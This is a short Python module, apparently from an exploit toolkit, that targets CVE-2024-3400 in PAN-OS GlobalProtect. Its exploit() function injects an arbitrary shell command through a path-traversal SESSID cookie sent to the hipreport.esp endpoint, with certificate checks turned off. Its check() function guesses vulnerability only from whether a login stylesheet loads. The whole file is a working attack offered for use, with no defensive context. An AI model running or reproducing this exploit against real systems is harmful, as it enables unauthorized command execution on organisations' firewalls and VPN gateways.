"""CVE-2024-3400 - PAN-OS GlobalProtect Command Injection."""

from __future__ import annotations

import requests


def check(target: str) -> dict:
    """Probe whether *target* exposes GlobalProtect endpoints."""
    try:
        resp = requests.get(
            f"{target}/global-protect/portal/css/login.css",
            timeout=10,
            verify=False,
        )
        vulnerable = resp.status_code == 200
        return {"cve": "CVE-2024-3400", "vulnerable": vulnerable}
    except requests.RequestException as exc:
        return {"cve": "CVE-2024-3400", "vulnerable": False, "error": str(exc)}


def exploit(target: str, command: str) -> dict:
    """Inject *command* via the SESSID cookie path traversal."""
    sessid = (
        "/../../../opt/panlogs/tmp/device_telemetry/minute/"
        f"../../../../../../tmp/;{command};"
    )
    try:
        resp = requests.post(
            f"{target}/ssl-vpn/hipreport.esp",
            cookies={"SESSID": sessid},
            timeout=10,
            verify=False,
        )
        return {
            "cve": "CVE-2024-3400",
            "success": resp.status_code == 200,
            "command": command,
            "status_code": resp.status_code,
        }
    except requests.RequestException as exc:
        return {
            "cve": "CVE-2024-3400",
            "success": False,
            "command": command,
            "error": str(exc),
        }
